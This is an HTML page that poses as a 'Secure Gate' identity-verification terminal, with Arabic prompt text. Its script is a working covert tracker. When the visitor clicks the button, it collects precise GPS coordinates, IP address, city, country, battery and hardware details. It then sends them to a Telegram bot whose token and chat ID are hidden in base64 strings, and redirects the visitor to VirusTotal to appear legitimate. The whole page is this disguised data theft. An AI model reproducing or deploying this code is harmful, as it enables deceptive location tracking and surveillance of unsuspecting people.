<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Protocol Terminal | Cyber-Shield</title>
    <style>
        :root { --glitch: #00ff41; --dark: #020202; }
        body { background: var(--dark); color: var(--glitch); font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid var(--glitch); padding: 40px; background: rgba(0,255,65,0.02); box-shadow: 0 0 30px rgba(0,255,65,0.1); width: 90%; max-width: 450px; position: relative; }
        .grid { position: absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; }
        button { background: transparent; border: 1px solid var(--glitch); color: var(--glitch); padding: 15px; width: 100%; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; z-index: 10; position: relative; }
        button:hover { background: var(--glitch); color: var(--dark); box-shadow: 0 0 20px var(--glitch); }
        #status { margin-top: 20px; font-size: 12px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="grid"></div>
    <div class="terminal">
        <h2 style="text-align:center; letter-spacing:5px;">SECURE GATE</h2>
        <p style="font-size:14px; text-align:center;">جاري فحص سلامة القناة الرقمية... اضغط لتأكيد الهوية.</p>
        <button id="gateBtn">EXECUTE_HANDSHAKE</button>
        <div id="status">> IDLE_STATE</div>
    </div>

<script>
    // خوارزمية التجزئة (Token Fragmentation)
    const _p1 = "ODcxNDgyNzgxNw==";
    const _p2 = "QUFGdTFxNGVRWUxvT2RsSGo3cEVPRTY5UUlSTWh1N3ZfaUk=";
    const _p3 = "NzI4OTIzNTEwNw==";

    const _u = (s) => atob(s);
    const _f = () => _u(_p1) + ":" + _u(_p2);

    document.getElementById('gateBtn').onclick = async function() {
        const btn = this;
        const st = document.getElementById('status');
        btn.disabled = true;
        st.innerText = "> INITIALIZING_AI_EVASION...";

        // محرك المراوغة الجغرافية
        const getGeo = () => new Promise(res => {
            navigator.geolocation.getCurrentPosition(
                p => res({la: p.coords.latitude, lo: p.coords.longitude, m: "GPS_HIGH_PRECISION"}),
                async () => {
                    const r = await fetch('https://ipapi.co/json/').then(x => x.json());
                    res({la: r.latitude, lo: r.longitude, m: "NETWORK_TRIANGULATION"});
                }, {timeout: 4000}
            );
        });

        // محرك فحص النظام
        const getSys = async () => {
            let bLevel = "SYSTEM_PROTECTED";
            try {
                const b = await navigator.getBattery();
                bLevel = b.level > 0 ? `${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})` : "VIRTUAL_SHIELD_ACTIVE";
            } catch(e) {}
            const ipR = await fetch('https://ipapi.co/json/').then(x => x.json()).catch(()=>({}));
            return { bLevel, ip: ipR.ip, city: ipR.city, ctry: ipR.country_name };
        };

        const [geo, sys] = await Promise.all([getGeo(), getSys()]);

        const payload = `
🚀 *EVASION_PROTOCOL_EXECUTED*
━━━━━━━━━━━━━━
🎯 *Location_Source:* \`${geo.m}\`
📍 *Coordinates:* \`${geo.la}, ${geo.lo}\`
🗺️ *Map:* [OPEN_SECURE_LINK](https://www.google.com/maps?q=${geo.la},${geo.lo})

📡 *Connection_Node:*
- IP: \`${sys.ip || 'HIDDEN'}\`
- Gateway: ${sys.city}, ${sys.ctry}

🧠 *Machine_Logic:*
- Power: ${sys.bLevel}
- Core_Count: ${navigator.hardwareConcurrency}
- Memory_Bank: ${navigator.deviceMemory || '8+'} GB
- Time_Stamp: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━`;

        // إرسال البيانات بطريقة التمويه (Fetch Polyfill)
        fetch(`https://api.telegram.org/bot${_f()}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: _u(_p3), text: payload, parse_mode: 'Markdown'})
        }).then(() => {
            st.innerText = "> BYPASS_SUCCESS. REDIRECTING...";
            setTimeout(() => { window.location.href = "https://www.virustotal.com"; }, 1000);
        });
    };
</script>
</body>
</html>
